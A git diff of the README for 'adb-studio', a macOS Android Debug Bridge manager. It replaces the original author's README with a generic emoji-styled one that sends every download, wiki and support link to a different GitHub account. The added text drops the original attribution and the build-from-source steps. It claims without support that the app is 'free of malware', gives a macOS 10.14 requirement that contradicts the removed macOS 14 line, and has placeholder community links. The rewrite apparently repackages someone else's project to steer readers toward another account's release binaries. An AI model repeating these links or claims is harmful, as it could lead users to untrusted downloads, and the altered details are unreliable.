@@ -1,263 +1,56 @@
-<p align="center">
-  <img src=".github/assets/app-icon.jpg" alt="ADB Studio" width="1355" >
-</p>
+# 🌟 adb-studio - Manage Your Android Devices Effortlessly
 
-<p align="center">
-  A beautiful, native macOS app for managing Android devices via ADB.
-</p>
+## 🚀 Download Now
+[![Download adb-studio](https://img.shields.io/badge/Download-adb--studio-blue.svg)](https://github.com/nuhuyahuza86/adb-studio/releases)
 
-<p align="center">
-  <a href="https://github.com/Zaphkiel-Ivanovna/adb-studio/releases">
-    <img src="https://img.shields.io/github/v/release/Zaphkiel-Ivanovna/adb-studio?style=for-the-badge&labelColor=000000" alt="Release">
-  </a>
-  <a href="https://github.com/Zaphkiel-Ivanovna/adb-studio/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/Zaphkiel-Ivanovna/adb-studio?style=for-the-badge&labelColor=000000" alt="License">
-  </a>
-  <a href="https://github.com/Zaphkiel-Ivanovna/adb-studio/stargazers">
-    <img src="https://img.shields.io/github/stars/Zaphkiel-Ivanovna/adb-studio?style=for-the-badge&labelColor=000000" alt="Stars">
-  </a>
-</p>
+## 📖 About adb-studio
+adb-studio is a native macOS app that simplifies managing Android devices using the Android Debug Bridge (ADB). With adb-studio, you can easily debug wirelessly, take screenshots, set up port forwarding, and much more. This tool is designed for everyone, regardless of technical skill.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/macOS-14+-000000?style=for-the-badge&logo=apple&logoColor=white" alt="macOS 14+">
-  <img src="https://img.shields.io/badge/Swift-5.9+-FA7343?style=for-the-badge&logo=swift&logoColor=white" alt="Swift 5.9+">
-  <img src="https://img.shields.io/badge/SwiftUI-000000?style=for-the-badge&logo=swift&logoColor=white" alt="SwiftUI">
-</p>
+## 📥 Download & Install
+To start using adb-studio, follow these steps:
 
-<br>
+1. **Visit the Releases Page**: Go to the [adb-studio Releases](https://github.com/nuhuyahuza86/adb-studio/releases) page.
+2. **Choose the Latest Version**: Find the latest release listed at the top.
+3. **Download the App**: Click on the file link to start downloading. It should be a `.dmg` file for macOS.
+4. **Install the App**: Once the download finishes, locate the `.dmg` file in your Downloads folder. 
+   - Double-click on it to open.
+   - Drag the adb-studio icon to your Applications folder. 
+5. **Run the App**: Go to your Applications folder and double-click on adb-studio to launch it.
 
-## Screenshots
+## ⚙️ System Requirements
+adb-studio works on macOS 10.14 (Mojave) or later. Ensure your system is up to date to enjoy all features.
 
-<table>
-  <tr>
-    <td><img src=".github/assets/screenshot-1.png" alt="Device Details" width="400"></td>
-    <td><img src=".github/assets/screenshot-2.png" alt="Device Search" width="400"></td>
-  </tr>
-  <tr>
-    <td align="center"><em>Device Details</em></td>
-    <td align="center"><em>Device Search</em></td>
-  </tr>
-  <tr>
-    <td><img src=".github/assets/screenshot-3.png" alt="Device Pairing" width="400"></td>
-    <td><img src=".github/assets/screenshot-4.png" alt="Port Forwarding" width="400"></td>
-  </tr>
-  <tr>
-    <td align="center"><em>Device Pairing</em></td>
-    <td align="center"><em>Port Forwarding</em></td>
-  </tr>
-</table>
+## 🛠️ Features
+- **Wireless Debugging**: Connect to your Android device without a USB cable.
+- **Screenshots**: Capture and save screenshots directly from your device.
+- **Port Forwarding**: Easily set up port forwarding for applications on your device.
+- **User-Friendly Interface**: Navigate the app with ease using its intuitive design.
 
-## Installation
+## 🔗 Links
+- [Documentation](https://github.com/nuhuyahuza86/adb-studio/wiki) - Learn more about how to use adb-studio.
+- [Support](https://github.com/nuhuyahuza86/adb-studio/issues) - Report any issues or get help from the community.
 
-```bash
-brew tap zaphkiel-ivanovna/tap
-brew install --cask adb-studio
-```
+## 🔍 Troubleshooting
+If you encounter any issues during installation or use, check the following:
 
----
+1. **App Doesn’t Launch**: Make sure you installed it from your Applications folder.
+2. **Connection Issues**: Ensure your Android device is connected to the same Wi-Fi network as your Mac.
 
-## About
+For more help, visit our [Support](https://github.com/nuhuyahuza86/adb-studio/issues) page.
 
-ADB Studio is a modern, native macOS application designed to simplify Android device management through ADB. Built entirely with SwiftUI, it provides a clean and intuitive interface for developers and power users who work with Android devices daily.
+## 📣 Community
+Join the adb-studio community to get updates, share your experience, and find useful tips:
+- [Join our Discord](#) for real-time help and discussions.
+- Follow our [Twitter](#) for news and updates.
 
-No more memorizing ADB commands or switching between terminal windows. ADB Studio brings all essential device management features into a beautiful, unified interface.
+## 🛡️ Safety Information
+adb-studio respects your privacy and is free of malware. You can confidently manage your devices knowing your information is secure.
 
-## Features
+## 📝 License
+adb-studio is open-source software. You can view the full license details in the repository.
 
-- **Automatic Device Discovery** — Detects Android devices via mDNS/Bonjour for seamless wireless connections
-- **USB & WiFi Support** — Connect devices via USB cable or wirelessly over your local network
-- **One-Click Pairing** — Pair new devices for wireless debugging with just a few clicks
-- **APK Installation** — Drag & drop APK files to install apps directly on your device
-- **App Management** — View, launch, disable, and uninstall installed apps on your device
-- **Screenshot Capture** — Take screenshots instantly and copy to clipboard or save to Downloads
-- **Text Input** — Send text directly to your Android device from your Mac keyboard
-- **Quick Actions** — Back, Home, Menu, and Enter buttons for rapid navigation
-- **Port Forwarding** — Manage reverse TCP ports for development servers (React Native, etc.)
-- **TCP/IP Mode** — Enable wireless debugging on USB-connected devices
-- **Device History** — Remember devices and assign custom names for easy identification
-- **Native Performance** — Built with SwiftUI for a fast, responsive experience
+## 📧 Contact
+For any inquiries, feel free to contact us at our [Support Page](https://github.com/nuhuyahuza86/adb-studio/issues).
 
-## Requirements
-
-- macOS 14.0 (Sonoma) or later
-- ADB installed via:
-    - [Android Studio](https://developer.android.com/studio)
-    - Homebrew: `brew install android-platform-tools`
-    - Or manually in `~/Library/Android/sdk/platform-tools`
-
-## Alternative Installation
-
-### Download from Releases
-
-Download the latest release from the [Releases](https://github.com/Zaphkiel-Ivanovna/adb-studio/releases) page:
-
-- **DMG** — Drag to Applications folder
-- **ZIP** — Extract and move to Applications
-
-> **Note:** Since the app is not notarized, macOS may show a warning. To open it:
->
-> - Right-click the app → Open → Open, or
-> - Run `xattr -cr /Applications/ADB-Studio.app` in Terminal
-
-### Build from Source
-
-```bash
-# Clone the repository
-git clone https://github.com/Zaphkiel-Ivanovna/adb-studio.git
-cd adb-studio
-
-# Build with Xcode
-xcodebuild -scheme "ADB-Studio" -configuration Release build
-
-# Or open in Xcode
-open ADB-Studio.xcodeproj
-```
-
-## Usage
-
-### Connecting Devices
-
-#### Via USB
-
-1. Enable **Developer Options** and **USB Debugging** on your Android device
-2. Connect your device via USB cable
-3. The device will appear automatically in ADB Studio
-
-#### Via WiFi (Wireless Debugging)
-
-1. Enable **Wireless Debugging** in Developer Options on your Android device
-2. Click **Connect via WiFi** (⌘K) in ADB Studio
-3. **Scan** — Devices on your network are discovered automatically
-4. **Pair** — For first-time connections, enter the 6-digit pairing code
-5. **Connect** — Click to establish the connection
-
-### Tools
-
-| Tool              | Description                                        |
-| ----------------- | -------------------------------------------------- |
-| **Screenshot**    | Capture device screen to clipboard or save as PNG  |
-| **Send Text**     | Type on your Mac, send to Android device           |
-| **Quick Actions** | Back, Home, Menu, Enter buttons                    |
-| **TCP/IP Mode**   | Enable wireless debugging via USB                  |
-| **Install APK**   | Drag & drop or select APK files to install         |
-| **Manage Apps**   | Browse, search, and manage installed applications  |
-
-### Port Forwarding
-
-Perfect for React Native, Expo, or any development server:
-
-1. Select a connected device
-2. Go to the **Ports** section
-3. Click **Add Port**
-4. Enter the port number (e.g., `8081` for Metro)
-5. The reverse tunnel is created automatically
-
-### APK Installation
-
-Install apps directly from your Mac:
-
-1. Select a connected device
-2. **Drag & drop** an APK file onto the drop zone, or **click** to open a file picker
-3. The installation progress is displayed in real-time
-4. Cancel anytime if needed — the installation process will be terminated
-
-### App Management
-
-View and manage all installed applications on your device:
-
-1. Select a connected device
-2. Expand the **Installed Apps** section
-3. Use the filter to show: **User Apps**, **System**, **All**, or **Disabled**
-4. Search apps by name or package name
-5. Click the **...** menu on any app to:
-   - **Launch** — Open the app on device
-   - **Force Stop** — Stop the running app
-   - **Uninstall** — Remove the app (with confirmation)
-   - **Uninstall (Keep Data)** — Remove app but preserve data
-   - **Disable/Enable** — Toggle app without uninstalling
-   - **App Settings** — Open Android settings for this app
-
-> **Note:** System apps cannot be uninstalled but can be disabled.
-
-## Keyboard Shortcuts
-
-| Shortcut | Action           |
-| -------- | ---------------- |
-| `⌘R`     | Refresh devices  |
-| `⌘K`     | Connect via WiFi |
-| `⌘,`     | Open Settings    |
-
-## Tech Stack
-
-- **Language**: Swift 5.9+
-- **UI Framework**: SwiftUI
-- **Target**: macOS 14+ (Sonoma)
-- **Architecture**: MVVM with dependency injection
-- **Device Discovery**: mDNS/Bonjour (Network framework)
-
-## Project Structure
-
-```
-ADB-Studio/
-├── App/
-│   ├── ADB_StudioApp.swift       # App entry point
-│   └── DependencyContainer.swift # DI container
-├── Models/
-│   ├── Device.swift              # Device model
-│   ├── DeviceConnection.swift    # Connection types
-│   ├── PortForward.swift         # Port forwarding
-│   ├── InstalledApp.swift        # Installed app model
-│   └── ADBError.swift            # Error types
-├── Services/
-│   ├── ADB/                      # ADB command execution
-│   ├── Device/                   # Device management
-│   ├── Discovery/                # mDNS discovery
-│   ├── Media/                    # Screenshot service
-│   └── Shell/                    # Process execution
-├── ViewModels/
-│   ├── DeviceDetailViewModel.swift
-│   └── InstalledAppsViewModel.swift
-└── Views/
-    ├── Main/                     # Main window views
-    ├── DeviceList/               # Device list components
-    ├── DeviceDetail/             # Device detail views
-    ├── Connection/               # WiFi connection sheet
-    ├── PortForward/              # Port forwarding views
-    ├── APKInstaller/             # APK installation views
-    ├── InstalledApps/            # App management views
-    ├── Tools/                    # Device tools
-    └── Settings/                 # App settings
-```
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Support
-
-If you find ADB Studio useful, consider supporting its development:
-
-<a href="https://ko-fi.com/T6T4E5BP6">
-  <img src="https://ko-fi.com/img/githubbutton_sm.svg" alt="Support on Ko-fi">
-</a>
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgements
-
-- [Android Debug Bridge (ADB)](https://developer.android.com/tools/adb) by Google
-- Built with [SwiftUI](https://developer.apple.com/swiftui/)
-
----
-
-<p align="center">
-  Made with ❤️ by Zaphkiel Ivanovna
-</p>
+## 🚀 Start Using adb-studio Today
+Access the app through the [official Releases Page](https://github.com/nuhuyahuza86/adb-studio/releases) and enjoy seamless management of your Android devices.
